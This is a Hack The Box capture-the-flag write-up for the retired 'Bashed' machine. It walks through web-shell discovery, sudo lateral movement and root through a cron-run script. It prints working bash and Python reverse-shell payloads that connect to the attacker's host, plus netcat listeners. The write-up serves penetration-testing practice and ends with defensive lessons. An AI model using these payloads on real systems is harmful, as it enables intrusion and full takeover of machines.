---
# Hack The Box: Bashed

| Attribute | Value |
|-----------|-------|
| **Difficulty** | Easy |
| **OS** | Linux |
| **IP** | 10.10.10.68 |
| **Points** | 20 |
| **Release Date** | December 2017 |
| **Retired Date** | May 2018 |
| **My Rating** | 5/10 |

## TL;DR
Found a hidden developer directory containing a fully functional `phpbash` web shell running as `www-data`. After using it to spawn a proper reverse shell, I found a `sudo` misconfiguration allowing me to switch to the `scriptmanager` user without a password. From there, I discovered a root cron job executing a Python script owned by `scriptmanager`, which I modified to catch a root shell.

## Reconnaissance
I started this box with a standard, fast all-ports scan to see what I was dealing with.

```bash
nmap -p- -T4 --min-rate 1000 10.10.10.68 -oA nmap/allports
```

The scan returned only one open port: 
*   **Port 80:** HTTP (Apache httpd 2.4.18)

Since there was no SSH or FTP to poke at, I knew this was going to be a pure web-to-system exploitation path. I ran a targeted service scan on port 80 to grab headers and basic info.

```bash
nmap -sC -sV -p 80 10.10.10.68 -oA nmap/http
```
<!-- screenshot: nmap initial scan results -->

The results confirmed an Ubuntu system running Apache 2.4.18. I opened my browser and navigated to `http://10.10.10.68`. The site was a simple blog titled "Arrexel's Development Site". 

<!-- screenshot: web application landing page -->

There was only one post on the homepage, but it was incredibly revealing. The author, `arrexel`, was showing off a tool he developed called `phpbash`. The post explicitly stated that it was a web-based interactive shell, and the screenshots showed it running on the very server I was currently attacking (the IP address in the screenshot matched the box). 

This was a massive, flashing neon sign. The developer had almost certainly left a copy of this `phpbash` script somewhere on the web server.

I didn't waste time trying to find SQL injections or XSS; I immediately fired up `gobuster` to find where this script was hiding.

```bash
gobuster dir -u http://10.10.10.68 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

The enumeration quickly found several directories: `/images`, `/js`, `/css`, `/fonts`, `/php`, and `/dev`. 

The `/dev` directory caught my eye immediately. "Development" directories in production are notoriously insecure.

## Initial Foothold
I navigated to `http://10.10.10.68/dev/` in my browser. Directory listing was enabled (another classic misconfiguration), and sitting right there were two files: `phpbash.php` and `phpbash.min.php`.

I clicked on `phpbash.php`. Instantly, I was greeted with a simulated terminal window right in my browser, running as the `www-data` user. 

I tested basic commands like `id`, `whoami`, and `ls -la`. Everything worked perfectly. While a web shell is great, it's HTTP-based, meaning it's stateless. Commands that require interactivity or break out into new processes (like running an exploit script or upgrading users) often hang or fail. 

I almost missed this—but then I realized I needed a true reverse TCP shell to properly enumerate the system for privilege escalation. 

I set up a Netcat listener on my attacking machine:
```bash
nc -lnvp 9999
```

Back in the `phpbash` window, I tried a standard bash reverse shell payload:
```bash
bash -i >& /dev/tcp/10.10.14.7/9999 0>&1
```

It hung. Nothing connected back to my listener. This happens sometimes with web shells due to how PHP executes the command or how special characters like `&` and `>` are interpreted. 

I decided to try a Python payload instead, as Ubuntu systems almost always have Python installed by default, and Python reverse shells tend to be more reliable in weird execution environments.

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.7",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

<!-- screenshot: successful exploitation (reverse shell) -->

That did the trick! My Netcat listener lit up. I immediately stabilized the shell to give myself tab-completion and a proper TTY.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
# Hit Ctrl+Z, then on host: stty raw -echo; fg
```

I navigated to `/home/arrexel/` and, to my surprise, the `user.txt` flag was world-readable. I grabbed it without needing to escalate privileges to that specific user.

## Lateral Movement
With the user flag secured, I started my standard privilege escalation checklist. The very first thing I check on any Linux box is `sudo` permissions.

```bash
sudo -l
```

<!-- screenshot: sudo -l output -->

The output was incredibly generous:
```text
Matching Defaults entries for www-data on bashed:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bashed:
    (scriptmanager : scriptmanager) NOPASSWD: ALL
```

This meant the `www-data` user could run *any* command as the user `scriptmanager` without needing a password. This was a direct path for lateral movement. 

I switched my user context to `scriptmanager`:
```bash
sudo -u scriptmanager /bin/bash
```

I verified the switch with `id`, confirming my new UID was `1001(scriptmanager)`. 

## Privilege Escalation
Now running as `scriptmanager`, I began hunting for why this specific user existed. A name like "scriptmanager" implies they are responsible for running or maintaining scripts on the system.

I started checking the root directory (`/`) and immediately noticed something odd.

```bash
ls -la /
```

There was a directory named `/scripts`. This is completely non-standard for Linux. Furthermore, it was owned by `scriptmanager` but the group was `root`. 

I moved into the directory to investigate.
```bash
cd /scripts
ls -la
```

Inside, there were two files:
*   `-rw-r--r-- 1 scriptmanager scriptmanager 58 Dec  4  2017 test.py`
*   `-rw-r--r-- 1 root          root          12 Dec  4  2017 test.txt`

The ownership discrepancy was the key. `test.py` was owned by my current user, but `test.txt` was owned by `root`. 

I checked the contents of the python script:
```python
cat test.py
# f = open("test.txt", "w")
# f.write("testing 123!")
# f.close
```

The script simply opened `test.txt` and wrote a string to it. The breakthrough came when I realized that if `test.py` was executed by my user, the resulting `test.txt` file would be owned by me. But since `test.txt` was owned by root, it meant that *root* must be executing `test.py`. 

Given that this is a CTF box, this almost certainly pointed to a cron job running on a frequent schedule (likely every minute).

Because I owned `test.py`, I could write to it. I didn't need to overwrite the cron job itself; I just needed to change the script that the cron job was executing. 

I overwrote `test.py` with a simple Python reverse shell, pointing it to a new port on my attacking machine.

```bash
cat << 'SHELL' > test.py
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("10.10.14.7",8888))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
SHELL
```

I quickly set up a second Netcat listener on port 8888. 

```bash
nc -lnvp 8888
```

I waited for about 45 seconds, watching the terminal. Suddenly, the connection popped. 

<!-- screenshot: root flag -->

```bash
id
# uid=0(root) gid=0(root) groups=0(root)
```

Root flag grabbed. Time to submit.

## Lessons Learned
- **Development Artifacts in Production:** Leaving a highly dangerous tool like `phpbash` in a world-readable `/dev` directory is a catastrophic failure. Testing tools and web shells must never be deployed to production servers.
- **Sudo Misconfigurations:** Allowing a low-privileged service account (`www-data`) to execute any command as another user completely bypasses intended security boundaries. If `www-data` is compromised, the attacker immediately gains access to whatever `scriptmanager` can do.
- **Insecure File Ownership in Cron Jobs:** If a root cron job executes a script owned by a lower-privileged user, that user can modify the script to achieve arbitrary execution as root. Scripts executed by root should always be owned by root and strictly permissioned (`chmod 700` or `755`).
- **What tripped me up:** Relying entirely on bash reverse shells for web-based injection points. They frequently fail due to bad character interpretation. 
- **Pro Tip:** When you spot a file owned by root that is constantly having its modification time updated (like `test.txt`), and it's located next to a script owned by a user you control, it is almost guaranteed to be a cron job exploitation path.

## References
- Reverse Shell Cheat Sheet: https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet
- Python Reverse Shells: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python
- Official Hack The Box Page: https://app.hackthebox.com/machines/Bashed
